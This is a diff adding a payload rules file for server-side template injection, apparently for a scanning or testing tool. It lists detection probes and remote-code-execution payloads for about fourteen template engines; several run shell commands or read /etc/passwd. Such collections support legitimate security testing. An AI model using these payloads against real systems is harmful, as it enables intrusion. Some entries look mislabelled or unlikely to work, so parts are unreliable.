@@ -1,0 +1,578 @@
+# SSTI (Server-Side Template Injection) Payload Rules
+# Organized by template engine with detection delimiters and exploitation payloads
+
+[[engine]]
+name = "jinja2"
+delimiters = ["{{", "}}", "{%", "%}"]
+description = "Python Jinja2 template engine"
+category = "python"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic evaluation"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{''.__class__.__mro__}}"
+description = "Python class introspection"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{''.__class__.__mro__[1].__subclasses__()}}"
+description = "List Python subclasses"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{''.__class__.__mro__[1].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}"
+description = "Remote code execution via os.popen"
+
+[[engine.payloads]]
+type = "control_flow"
+payload = "{% for x in range(10) %}{{x}}{% endfor %}"
+description = "Control flow execution"
+
+[[engine.payloads]]
+type = "control_flow"
+payload = "{% if 7*7 == 49 %}vulnerable{% endif %}"
+description = "Conditional evaluation"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{% import os %}{{os.popen('id').read()}}"
+description = "Import and execute"
+
+[[engine.payloads]]
+type = "filter"
+payload = "{{ request|attr('application')|attr('__globals__')|attr('__builtins__')|attr('__import__')('os')|attr('popen')('id')|attr('read')() }}"
+description = "Filter-based RCE bypass"
+
+[[engine]]
+name = "twig"
+delimiters = ["{{", "}}", "{%", "%}"]
+description = "PHP Twig template engine"
+category = "php"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{id}}"
+description = "Function evaluation"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{['id']|filter('system')}}"
+description = "Filter-based command execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{['cat /etc/passwd']|filter('passthru')}}"
+description = "Alternative filter execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"
+description = "Self environment RCE"
+
+[[engine]]
+name = "freemarker"
+delimiters = ["${", "<#", ">"]
+description = "Java Freemarker template engine"
+category = "java"
+
+[[engine.payloads]]
+type = "expression"
+payload = "${7*7}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "assignment"
+payload = "<#assign x=\"freemarker\">"
+description = "Variable assignment"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${\"freemarker.template.utility.Execute\"?new()(\"id\")}"
+description = "Execute utility RCE"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${x?new()}"
+description = "Object instantiation"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"
+description = "Assigned execute object"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "${.data_model?keys}"
+description = "Data model introspection"
+
+[[engine]]
+name = "pebble"
+delimiters = ["{{", "}}"]
+description = "Java Pebble template engine"
+category = "java"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{\"\".getClass().forName(\"java.lang.Runtime\")}}"
+description = "Class loading"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{\"\".getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")}}"
+description = "Runtime exec RCE"
+
+[[engine.payloads]]
+type = "assignment"
+payload = "{% set x = 7*7 %}{{x}}"
+description = "Variable assignment"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{bean.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",java.lang.String.class).invoke(bean.getClass().forName(\"java.lang.Runtime\").getRuntime(),\"id\")}}"
+description = "Reflective method invocation"
+
+[[engine]]
+name = "velocity"
+delimiters = ["#", "$"]
+description = "Java Apache Velocity template engine"
+category = "java"
+
+[[engine.payloads]]
+type = "expression"
+payload = "#{7*7}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "assignment"
+payload = "#set($x=7*7)"
+description = "Variable assignment"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "$class.inspect(\"java.lang.Runtime\")"
+description = "Class inspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "#set($x=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))"
+description = "Runtime exec via class inspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "$class.inspect(\"java.lang.System\").type.getProperty(\"os.name\")"
+description = "System property access"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "$class.toolbox"
+description = "Toolbox introspection"
+
+[[engine]]
+name = "erb"
+delimiters = ["<%", "%>"]
+description = "Ruby ERB template engine"
+category = "ruby"
+
+[[engine.payloads]]
+type = "expression"
+payload = "<%= 7*7 %>"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= system('id') %>"
+description = "System command execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= `id` %>"
+description = "Backtick command execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= IO.popen('id').read %>"
+description = "IO popen execution"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "<%= Object.constants %>"
+description = "Object constants introspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= eval(\"`id`\") %>"
+description = "Eval execution"
+
+[[engine]]
+name = "smarty"
+delimiters = ["{", "}"]
+description = "PHP Smarty template engine"
+category = "php"
+
+[[engine.payloads]]
+type = "php_tag"
+payload = "{php}echo 'test';{/php}"
+description = "PHP tag execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"\",self::clearConfig)}"
+description = "File write via internal class"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{system('id')}"
+description = "System command"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{$smarty.version}"
+description = "Version disclosure"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{eval var='<?php system(\"id\"); ?>'}"
+description = "Eval with PHP tags"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{fetch file='file:///etc/passwd'}"
+description = "Local file inclusion"
+
+[[engine]]
+name = "thymeleaf"
+delimiters = ["th:", "${", "}"]
+description = "Java Thymeleaf template engine"
+category = "java"
+
+[[engine.payloads]]
+type = "expression"
+payload = "th:text=\"${7*7}\""
+description = "Basic arithmetic in attribute"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${#ctx.getClass().forName('java.lang.Runtime').getRuntime().exec('id')}"
+description = "Context-based RCE"
+
+[[engine.payloads]]
+type = "expression"
+payload = "${#vars}"
+description = "Variables introspection"
+
+[[engine.payloads]]
+type = "expression"
+payload = "${#ctx}"
+description = "Context introspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${T(java.lang.Runtime).getRuntime().exec('id')}"
+description = "Type access RCE"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "${#ctx.getBeanNames()}"
+description = "Bean enumeration"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}"
+description = "Scanner-based output reading"
+
+[[engine]]
+name = "pug"
+delimiters = ["#{", "!{", "- "]
+description = "Node.js Pug template engine"
+category = "javascript"
+
+[[engine.payloads]]
+type = "expression"
+payload = "#{7*7}"
+description = "Basic interpolation"
+
+[[engine.payloads]]
+type = "expression"
+payload = "!{7*7}"
+description = "Unescaped interpolation"
+
+[[engine.payloads]]
+type = "rce"
+payload = "- require('child_process').execSync('id').toString()"
+description = "Node.js require execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "- var x = eval(\"require('child_process').execSync('id')\")"
+description = "Eval-based execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "= global.process.mainModule.require('child_process').execSync('id').toString()"
+description = "Global process execution"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "= JSON.stringify(global)"
+description = "Global object dump"
+
+[[engine]]
+name = "nunjucks"
+delimiters = ["{{", "}}", "{%", "%}"]
+description = "JavaScript Nunjucks template engine"
+category = "javascript"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "control_flow"
+payload = "{% for x in range(10) %}{{x}}{% endfor %}"
+description = "Range iteration"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}"
+description = "Constructor-based RCE"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{ Object.keys(global) }}"
+description = "Global keys enumeration"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{% set x = range.constructor('return process')() %}{{x.mainModule.require('child_process').execSync('id').toString()}}"
+description = "Set-based constructor RCE"
+
+[[engine.payloads]]
+type = "filter"
+payload = "{{ [].constructor.constructor('return process')() }}"
+description = "Array constructor access"
+
+[[engine]]
+name = "mako"
+delimiters = ["${", "<%", "%>"]
+description = "Python Mako template engine"
+category = "python"
+
+[[engine.payloads]]
+type = "expression"
+payload = "${7*7}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<% import os %><% os.system('id') %>"
+description = "Import and system execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<% __import__('os').popen('id').read() %>"
+description = "Direct import execution"
+
+[[engine.payloads]]
+type = "expression"
+payload = "${self.module.cache.util}"
+description = "Self module introspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "${self.module.cache.util.os.system('id')}"
+description = "Module cache RCE"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<% ctx.get('__builtins__').__import__('os').popen('id').read() %>"
+description = "Context builtins RCE"
+
+[[engine]]
+name = "blade"
+delimiters = ["{{", "}}", "@", "!{"]
+description = "PHP Laravel Blade template engine"
+category = "php"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "rce"
+payload = "@php(system('id'));@endphp"
+description = "PHP directive execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{system('id')}}"
+description = "Direct system call"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{!! system('id') !!}"
+description = "Unescaped output execution"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{\\App\\Facades\\Auth::user()}}"
+description = "Facade access"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{$_GET['x']($_GET['y'])}}"
+description = "Dynamic function execution"
+
+[[engine]]
+name = "liquid"
+delimiters = ["{{", "}}", "{%", "%}"]
+description = "Ruby Liquid template engine"
+category = "ruby"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{ site | inspect }}"
+description = "Site object inspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{'/etc/passwd' | file_exists}}"
+description = "File existence check"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{ site | map: 'constants' | first }}"
+description = "Constants enumeration attempt"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "{{ context.registers }}"
+description = "Registers introspection"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{ 7 | replace: 7, system('id') }}"
+description = "Replace filter execution"
+
+[[engine]]
+name = "handlebars"
+delimiters = ["{{", "}}", "{{{", "}}}"]
+description = "JavaScript Handlebars template engine"
+category = "javascript"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{7*7}}"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{#with 's' as |string|}}{{#with 'e'}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string slice)}}{{this.pop}}{{this.push (lookup string \"eval\")}}{{this.pop}}{{this.push \"require('child_process').execSync('id').toString()\"}}{{this.pop}}{{this.pop}}{{this.pop}}{{this.pop}}{{/with}}{{/with}}{{/with}}"
+description = "Complex helper-based RCE"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{lookup (lookup (lookup this 'constructor') 'constructor') 'apply'}}"
+description = "Deep lookup constructor access"
+
+[[engine.payloads]]
+type = "expression"
+payload = "{{{7*7}}}"
+description = "Unescaped expression"
+
+[[engine.payloads]]
+type = "helper"
+payload = "{{#each []}}{{this}}{{/each}}"
+description = "Each helper"
+
+[[engine.payloads]]
+type = "rce"
+payload = "{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString()}}"
+description = "Constructor chain RCE"
+
+[[engine]]
+name = "ejs"
+delimiters = ["<%", "%>"]
+description = "JavaScript EJS template engine"
+category = "javascript"
+
+[[engine.payloads]]
+type = "expression"
+payload = "<%= 7*7 %>"
+description = "Basic arithmetic"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<% require('child_process').execSync('id') %>"
+description = "Require-based execution"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= global.process.mainModule.require('child_process').execSync('id').toString() %>"
+description = "Global process execution"
+
+[[engine.payloads]]
+type = "introspection"
+payload = "<%= JSON.stringify(global) %>"
+description = "Global object dump"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<% var x = process.mainModule.require; x('child_process').execSync('id') %>"
+description = "Variable-based require"
+
+[[engine.payloads]]
+type = "rce"
+payload = "<%= (function(){ return require('child_process').execSync('id').toString() })() %>"
+description = "IIFE-based execution"
+
+# Polyglot payloads that trigger multiple engines
+[[polyglot]]
+name = "polyglot_probe"
+description = "Payload designed to trigger multiple template engines"
+payload = "${{<%[%'\"}}%\\."
+
+[[polyglot]]
+name = "jinja_twig"
+description = "Works in both Jinja2 and Twig"
+payload = "{{7*7}}"
+
+[[polyglot]]
+name = "java_universal"
+description = "Works in multiple Java engines"
+payload = "${7*7}"
+
+[[polyglot]]
+name = "erb_style"
+description = "Works in ERB and similar"
+payload = "<%= 7*7 %>"
+
+[[polyglot]]
+name = "velocity_style"
+description = "Works in Velocity and similar"
+payload = "#{7*7}"
+
+[[polyglot]]
+name = "universal_interpolation"
+description = "Common interpolation pattern"
+payload = "${7*7}"
